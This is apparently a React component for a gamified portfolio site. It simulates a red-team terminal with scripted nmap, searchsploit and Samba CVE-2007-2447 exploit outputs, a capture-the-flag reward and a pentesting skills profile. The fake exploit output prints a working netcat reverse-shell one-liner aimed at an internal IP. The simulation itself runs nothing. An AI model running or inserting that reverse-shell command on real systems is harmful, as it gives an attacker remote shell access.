import React, { useState, useRef, useEffect } from 'react';
import { soundFX } from '../../game/utils/sound';
import './PanelContent.css';

interface PanelProps {
  onClose: () => void;
  onMissionComplete?: (missionId: string) => void;
}

interface TerminalHistory {
  command: string;
  output: string | React.ReactNode;
}

const ReconTerminalPanel: React.FC<PanelProps> = ({ onMissionComplete }) => {
  const [history, setHistory] = useState<TerminalHistory[]>([
    {
      command: 'init',
      output: (
        <div>
          <div style={{ color: '#00ff88', fontWeight: 'bold' }}>
            ⚡ RED TEAM OFFENSIVE OPERATING ENVIRONMENT v4.8
          </div>
          <div>Target system locked: <span style={{ color: '#00ffff' }}>target.corp.internal (10.0.4.15)</span></div>
          <div>Type <span style={{ color: '#ffaa00' }}>help</span> to list active reconnaissance and exploitation commands.</div>
        </div>
      ),
    },
  ]);
  const [inputVal, setInputVal] = useState('');
  const [hasRoot, setHasRoot] = useState(false);
  const [missionTriggered, setMissionTriggered] = useState(false);
  const endRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    endRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [history]);

  const runCommand = (cmd: string) => {
    const trimmed = cmd.trim();
    if (!trimmed) return;

    soundFX.playInteract();

    const lower = trimmed.toLowerCase();
    let response: React.ReactNode = '';

    if (lower === 'clear') {
      setHistory([]);
      setInputVal('');
      return;
    } else if (lower === 'help') {
      response = (
        <div>
          <div style={{ color: '#00ffff', fontWeight: 'bold' }}>AVAILABLE RED TEAM TOOLS:</div>
          <div>  <span style={{ color: '#00ff88' }}>nmap -sV target.corp</span> - Port scan & service version detection</div>
          <div>  <span style={{ color: '#00ff88' }}>searchsploit samba</span> - Search Exploit-DB for known vulnerabilities</div>
          <div>  <span style={{ color: '#00ff88' }}>exploit</span> - Run payload against vulnerable Samba service</div>
          <div>  <span style={{ color: '#00ff88' }}>whoami</span> - Display current user privilege level</div>
          <div>  <span style={{ color: '#00ff88' }}>cat flag.txt</span> - Read captured target flag</div>
          <div>  <span style={{ color: '#00ff88' }}>ls</span> - List directory files</div>
          <div>  <span style={{ color: '#00ff88' }}>clear</span> - Clear terminal buffer</div>
        </div>
      );
    } else if (lower === 'ls' || lower === 'dir') {
      response = (
        <div>
          <div>drwxr-xr-x  2 operator operator  4096 Oct 17 20:00 <span style={{ color: '#00ffff' }}>recon_scripts/</span></div>
          <div>-rwxr-xr-x  1 operator operator   824 Oct 17 20:10 <span style={{ color: '#00ff88' }}>samba_exploit.py</span></div>
          <div>-rw-r--r--  1 operator operator   218 Oct 17 20:15 <span style={{ color: '#ffaa55' }}>targets.txt</span></div>
          {hasRoot && <div>-rw-------  1 root     root        48 Oct 17 20:30 <span style={{ color: '#ff3355' }}>flag.txt</span></div>}
        </div>
      );
    } else if (lower.includes('nmap')) {
      response = (
        <div>
          <div>Starting Nmap 7.94 ( https://nmap.org ) at 2026-10-17 20:25 UTC</div>
          <div>Nmap scan report for target.corp.internal (10.0.4.15)</div>
          <div>Host is up (0.0012s latency).</div>
          <div style={{ color: '#00ffff', marginTop: '6px' }}>
            PORT     STATE SERVICE     VERSION<br />
            22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5<br />
            80/tcp   open  http        Apache httpd 2.4.41<br />
            139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X<br />
            445/tcp  open  netbios-ssn Samba 3.0.20-Debian (VULNERABLE)
          </div>
          <div style={{ color: '#ffaa00', marginTop: '6px' }}>
            ⚠ Service detection hit: Samba 3.0.20 detected on port 445! Run `searchsploit samba` to check exploits.
          </div>
        </div>
      );
    } else if (lower.includes('searchsploit')) {
      response = (
        <div>
          <div style={{ color: '#00ffff' }}>Exploit Title | Path</div>
          <div>--------------------------------------------------|------------------------</div>
          <div style={{ color: '#00ff88' }}>
            Samba 3.0.20 &lt; 3.0.25rc3 - 'Username' map script | unix/remote/16320.rb<br />
            CVE-2007-2447 Remote Command Execution Vulnerability (Root Shell)
          </div>
          <div style={{ color: '#ffaa00', marginTop: '6px' }}>
            Type `exploit` to launch payload against target.corp.internal!
          </div>
        </div>
      );
    } else if (lower === 'exploit' || lower.includes('samba_exploit.py')) {
      setHasRoot(true);
      soundFX.playHackSuccess();
      response = (
        <div>
          <div>[+] Connecting to target.corp.internal:445...</div>
          <div>[+] Injecting payload: `nohup mkfifo /tmp/s; /bin/sh -i 2&gt;&amp;1 &lt;/tmp/s | nc 10.0.4.5 4444 &gt;/tmp/s &amp;`</div>
          <div>[+] Sending malicious MS-RPC username authorization packet...</div>
          <div style={{ color: '#00ff88', fontWeight: 'bold' }}>[✓] EXPLOIT SUCCESSFUL! Reverse interactive root shell established.</div>
          <div style={{ color: '#ffff00', marginTop: '4px' }}>
            Type `whoami` or `cat flag.txt` to verify root privileges!
          </div>
        </div>
      );
    } else if (lower === 'whoami') {
      response = hasRoot ? (
        <span style={{ color: '#ff3355', fontWeight: 'bold' }}>root (uid=0, gid=0)</span>
      ) : (
        <span style={{ color: '#00ffff' }}>operator (uid=1000)</span>
      );
    } else if (lower.includes('flag') || lower === 'cat flag.txt') {
      if (!hasRoot) {
        soundFX.playHackError();
        response = <span style={{ color: '#ff4444' }}>Permission denied: flag.txt is readable by root only.</span>;
      } else {
        if (!missionTriggered && onMissionComplete) {
          onMissionComplete('mission-3');
          setMissionTriggered(true);
        }
        soundFX.playLevelUp();
        response = (
          <div className="flag-box">
            <div style={{ color: '#00ff88', fontSize: '16px', fontWeight: 'bold' }}>
              🚩 FLAG&#123;RED_TEAM_ROOT_COMPROMISE_2026&#125;
            </div>
            <div style={{ color: '#88ffff', marginTop: '8px' }}>
              Host compromised with full root access! Offensive Security Mission Completed: +200 XP!
            </div>
          </div>
        );
      }
    } else {
      response = (
        <span style={{ color: '#ffaa55' }}>
          command not found: {trimmed}. Type <span style={{ color: '#00ffff' }}>help</span> for available commands.
        </span>
      );
    }

    setHistory((prev) => [...prev, { command: trimmed, output: response }]);
    setInputVal('');
  };

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Enter') {
      runCommand(inputVal);
    }
  };

  return (
    <div className="terminal-panel">
      <div className="terminal-header">
        <span className="terminal-prompt">RED TEAM CLI SANDBOX // BASH</span>
        <span className="terminal-status" style={{ color: hasRoot ? '#ff3355' : '#00ff88' }}>
          {hasRoot ? '● ROOT ACCESS GRANTED' : '● PRIVILEGE: OPERATOR'}
        </span>
      </div>

      <div className="terminal-content">
        <div className="cli-terminal-window">
          {history.map((h, i) => (
            <div key={i} className="cli-history-entry">
              {h.command !== 'init' && (
                <div className="cli-command-line">
                  <span className="cli-prompt">{hasRoot ? 'root@target:~#' : 'operator@cyberops:~$'}</span>
                  <span className="cli-command-text">{h.command}</span>
                </div>
              )}
              <div className="cli-output-line">{h.output}</div>
            </div>
          ))}

          <div className="cli-command-line" style={{ marginTop: '8px' }}>
            <span className="cli-prompt">{hasRoot ? 'root@target:~#' : 'operator@cyberops:~$'}</span>
            <input
              type="text"
              className="cli-input"
              value={inputVal}
              onChange={(e) => setInputVal(e.target.value)}
              onKeyDown={handleKeyDown}
              placeholder="Type command here (e.g. nmap, exploit, help)..."
              autoFocus
            />
          </div>
          <div ref={endRef} />
        </div>

        {/* Quick action buttons for convenience / mobile */}
        <div className="quick-command-bar">
          <span style={{ color: '#00ffaa', fontSize: '11px', marginRight: '6px' }}>QUICK COMMANDS:</span>
          <button className="quick-chip" onClick={() => runCommand('help')}>help</button>
          <button className="quick-chip" onClick={() => runCommand('nmap -sV target.corp')}>nmap</button>
          <button className="quick-chip" onClick={() => runCommand('searchsploit samba')}>searchsploit</button>
          <button className="quick-chip" onClick={() => runCommand('exploit')}>exploit</button>
          <button className="quick-chip" onClick={() => runCommand('cat flag.txt')}>cat flag.txt</button>
          <button className="quick-chip" onClick={() => runCommand('clear')}>clear</button>
        </div>

        <div className="redteam-projects" style={{ marginTop: '20px' }}>
          <h3>Mohammed's Offensive Security & Pentesting Profile:</h3>
          <ul>
            <li><strong>HackTheBox & TryHackMe:</strong> Actively solves Linux and Windows AD exploitation labs.</li>
            <li><strong>Methodologies:</strong> Reconnaissance (OSINT, Subfinder, Amass), Port Enumeration, Web App Security (OWASP Top 10), Privilege Escalation (Linux SUID, Windows Token Impersonation).</li>
            <li><strong>Bug Bounty Research:</strong> Ethical disclosure of access-control flaws and server misconfigurations.</li>
          </ul>
        </div>

        {hasRoot && (
          <div className="mission-complete">
            <span className="checkmark">✓</span> Mission 3 Complete: Red Team Sandbox Conquered (+200 XP)!
          </div>
        )}
      </div>
    </div>
  );
};

export default ReconTerminalPanel;
